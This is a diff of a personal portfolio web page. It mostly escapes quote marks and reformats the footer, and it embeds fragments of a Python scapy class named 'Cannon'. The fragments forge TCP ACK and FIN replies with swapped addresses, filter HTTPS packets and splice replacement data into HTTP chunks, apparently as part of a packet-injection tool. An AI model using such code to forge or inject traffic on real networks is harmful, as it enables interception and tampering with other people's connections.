-    ip = IP(src =self.dst, dst =self.src) #'192.168.2.101'
-    ack = TCP(sport = tcp.dport, dport = tcp.sport, flags ='A' , seq = tcp.ack, ack = tcp.seq+len(tcp.payload))
+    ip = IP(src =self.dst, dst =self.src) #&#39;192.168.2.101&#39;
+    ack = TCP(sport = tcp.dport, dport = tcp.sport, flags =&#39;A&#39; , seq = tcp.ack, ack = tcp.seq+len(tcp.payload))
     pushReply = ip/ack
     finReply = pushReply.copy()
     finReply.flags =1
@@ -705,8 +702,8 @@ class Cannon(object):
   def isHTTPS(self, pkt):
     if self.filterAck == -1:
       return False
-    #print 'packet src port' +str(pkt[TCP].sport)
-    #print 'target server port' +str(self.serverPort)
+    #print &#39;packet src port&#39; +str(pkt[TCP].sport)
+    #print &#39;target server port&#39; +str(self.serverPort)
 
     if pkt[TCP].ack == self.filterAck:
       print pkt[TCP].ack
@@ -736,7 +733,7 @@ class Chunk(object):
   def pushFront(self, replacement):
     self.len = len(replacement)
     ret = self.data[-len:]
-    self.data = self.data.replace(ret, '')
+    self.data = self.data.replace(ret, &#39;&#39;)
     self.data = replacement + self.data
 
     return ret
@@ -745,41 +742,26 @@ class Chunk(object):
     self.data = self.data + RN + hex(len(newChunk)) + RN + newChunk
 
 									</code></pre>
-								</div>
-								
-								
-						
-								
-						</div>
+</header>
+</div>
+</div>
+</div>
+</div>
+<!-- Footer -->
 
-					</div>
-				</div>
-				
-		
+<footer id="footer">
+<ul class="icons">
+	<li><a class="icon alt fa-linkedin" href="https://www.linkedin.com/in/euiwonkim"><span class="label">LinkedIn</span></a></li>
+	<li><a class="icon alt fa-github" href="https://github.com/jeo1kim"><span class="label">GitHub</span></a></li>
+	<li><a class="icon alt fa-envelope" href="mailto:jeo1kim@gmail.com"><span class="label">Email</span></a></li>
+</ul>
 
-			<!-- Footer -->
-				<footer id="footer">
-					<ul class="icons">
-						<li><a href="https://www.linkedin.com/in/euiwonkim" class="icon alt fa-linkedin"><span class="label">LinkedIn</span></a></li>
-						<li><a href="https://github.com/jeo1kim" class="icon alt fa-github"><span class="label">GitHub</span></a></li>
-						<li><a href="mailto:jeo1kim@gmail.com" class="icon alt fa-envelope"><span class="label">Email</span></a></li>
-					</ul>
-					<ul class="copyright">
-						<li>&copy; Awesome Possom. All rights reserved.</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
-						<li>Logo: <a href="Cargocollective.com/alicesung">Alice Sung Kim</a></ul>					</ul>
-				</footer>
-
-		</div>
-
-		<!-- Scripts -->
-			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/jquery.scrolly.min.js"></script>
-			<script src="assets/js/jquery.dropotron.min.js"></script>
-			<script src="assets/js/jquery.scrollex.min.js"></script>
-			<script src="assets/js/skel.min.js"></script>
-			<script src="assets/js/util.js"></script>
-			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
-			<script src="assets/js/main.js"></script>
-
-	</body>
+<ul class="copyright">
+	<li>&copy; Awesome Possom. All rights reserved.</li>
+	<li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+	<li>Logo: <a href="Cargocollective.com/alicesung">Alice Sung Kim</a></li>
+</ul>
+</footer>
+</div>
+<!-- Scripts --><script src="assets/js/jquery.min.js"></script><script src="assets/js/jquery.scrolly.min.js"></script><script src="assets/js/jquery.dropotron.min.js"></script><script src="assets/js/jquery.scrollex.min.js"></script><script src="assets/js/skel.min.js"></script><script src="assets/js/util.js"></script><!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]--><script src="assets/js/main.js"></script></body>
 </html>
